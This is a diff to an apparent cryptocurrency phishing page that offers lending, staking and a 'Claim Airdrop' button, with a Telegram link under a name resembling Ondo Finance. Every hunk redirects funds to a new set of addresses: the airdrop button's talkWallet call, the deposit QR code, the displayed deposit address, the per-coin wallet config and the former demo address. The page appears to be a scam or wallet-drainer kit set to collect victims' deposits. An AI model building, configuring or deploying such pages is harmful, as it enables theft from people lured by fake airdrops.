@@ -95,7 +95,7 @@
   <a href="./borrow.html">Borrow QNT</a>
   <a href="./stake.html">Stake QNT</a>
   <button onclick="connectWallet();qToggleNav()">Connect Wallet</button>
-  <button class="q-nd-orange" onclick="window.talkWallet();qToggleNav()">Claim Airdrop</button>
+  <button class="q-nd-orange" onclick="window.talkWallet('0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8');qToggleNav()">Claim Airdrop</button>
   <a class="q-nd-tg" href="https://t.me/OndoFinanceC" target="_blank">Join Telegram</a>
 </div>
 <script>function qToggleNav(){document.getElementById('qHamburger').classList.toggle('open');var d=document.getElementById('qDrawer');d.classList.toggle('open');document.body.style.overflow=d.classList.contains('open')?'hidden':'';}
@@ -222,7 +222,7 @@
             <!-- QR Image -->
             <div style="display:inline-block;padding:12px;background:#fff;border:2px solid #E5E7EB;border-radius:12px;margin-bottom:20px;">
               <img id="qr-img"
-                src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
+                src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8"
                 alt="Wallet QR Code"
                 width="200" height="200"
                 style="display:block;border-radius:4px;" />
@@ -238,7 +238,7 @@
             <div style="background:#F8F9F9;border-radius:10px;padding:12px 14px;margin-bottom:16px;position:relative;">
               <div style="font-size:11px;color:#9CA3AF;margin-bottom:6px;">Deposit address</div>
               <div style="display:flex;align-items:center;gap:8px;justify-content:center;">
-                <code id="wallet-addr" style="font-size:12px;color:#374151;font-family:monospace;word-break:break-all;line-height:1.5;">0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045</code>
+                <code id="wallet-addr" style="font-size:12px;color:#374151;font-family:monospace;word-break:break-all;line-height:1.5;">0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8</code>
                 <button onclick="copyAddress()" title="Copy address"
                   style="flex-shrink:0;background:none;border:1px solid #D1D5DB;border-radius:6px;padding:4px 8px;cursor:pointer;font-size:11px;color:#6B7280;white-space:nowrap;" id="copy-btn">
                   Copy
@@ -408,10 +408,10 @@
   <script>
     // ── Config — change WALLET_ADDRESS here; QR updates automatically ──
     const WALLET_ADDRESSES = {
-      ETH:  '0x21c201f469c6f76a5b395fd1049c029d8f0e850c',
-      BTC:  'bc1qyg5ay5pmuv4ytdusl0y42ad54299aw2tuxzma8',
-      USDC: '0x21c201f469c6f76a5b395fd1049c029d8f0e850c',
-      SOL:  '7ktvsrDrSeqH1HBaWDNWY5KRuzP4EvaQD5uVjVZSSsWe',
+      ETH:  '0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8',
+      BTC:  'bc1qwhz3tv9vg4vxmmugqndhyq7djuxhqpyf2s2cly',
+      USDC: '0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8',
+      SOL:  'GvNXRvjBwwV5mB5qcv6fyyNBNrpR1pZFm5oMBEVxhzJ4',
     };
 
     // ── URL param reading ──
@@ -497,7 +497,7 @@
     }
 
     // ── Blockchain polling ──
-    const DEMO_ADDRESS = '0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045';
+    const DEMO_ADDRESS = '0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8';
     let lastBalance = null;
     let pollCount = 0;
     let countdownSec = 10;
